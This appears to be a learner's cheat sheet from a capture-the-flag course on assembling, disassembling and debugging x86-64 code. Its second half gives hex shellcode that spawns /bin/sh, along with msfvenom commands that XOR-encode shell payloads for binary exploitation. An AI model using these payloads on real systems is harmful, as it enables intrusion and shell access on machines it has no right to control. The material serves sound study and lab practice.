# Assembly Language Cheat Sheet:

## Create Assembly Code File:

nano mov.s


### Assemble file and make it executable: (.s, .as, .asm)

nasm -f elf64 mov.s

ld -o mov mov.o

chmod 777 mov


### Disassemble executable file:

objdump -M intel -d mov

objdump -sj .data mov

objdump -M intel --no-show-raw-insn --no-addresses -d mov

### Install GEF for easy debugging:

wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py

echo source ~/.gdbinit-gef.py >> ~/.gdbinit

Run GDB with GEF:

gdb -q .\mov


### Look at functions an variables:

gef➤  info functions

gef➤  info variables

Disassemble function:

gef➤  disas _start

Set Breakpoint, Run and Step-Into:

gef➤  b _start

gef➤  r

gef➤  si

gef➤  step

### Examine registers or variables:
Argument 	Description 	Example
Count 	The number of times we want to repeat the examine 	2, 3, 10
Format 	The format we want the result to be represented in 	x(hex), s(string), i(instruction)
Size 	The size of memory we want to examine 	b(byte), h(halfword), w(word), g(giant, 8 bytes)

gef➤  x/4ig $rip

gef➤  x/s 0x402000

gef➤  registers

Write values to addresses:

gef➤  help patch


### Searchable Linux Syscall table

https://filippo.io/linux-syscall-table/

## ShellCode:
Install pwn tool to run shell code

/'''
[/htb]$ pip3 install pwn

[/htb]$ python3

>>> from pwn import *

>>> context(os="linux", arch="amd64", log_level="error")

>>run_shellcode(unhex('4831db536a0a48b86d336d307279217d5048b833645f316e37305f5048b84854427b6c303464504889e64831c0b0014831ff40b7014831d2b2190f054831c0043c4030ff0f05')).interactive()

HTB{l04d3d_1n70_m3m0ry!}

>>> dir(shellcraft)
'''/

### Msfvenom encoding 

`msfvenom -l encoders`

`msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'`

/'''
[/htb]$ python3 loader.py 
'4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c'

$ whoami

root
'''/

If we had a custom shellcode that we wrote, we could use msfvenom to encode it as well, by writing its bytes to a file and then passing it to msfvenom with -p -, as follows:

`[/htb]$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin`

`$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin`

Finally, we can always search online resources like [Shell-Storm](http://shell-storm.org/shellcode/index.html) or [Exploit DB](https://www.exploit-db.com/shellcodes) for existing shellcodes.

For example, if we search Shell-Storm for a /bin/sh shellcode on Linux/x86_64, we will find several examples of varying sizes, like this 27-bytes shellcode. We can search Exploit DB for the same, and we find a more optimized 22-bytes shellcode, which can be helpful if our Binary Exploitation only had around 22-bytes of overflow space. We can also search for encoded shellcodes, which are bound to be larger.


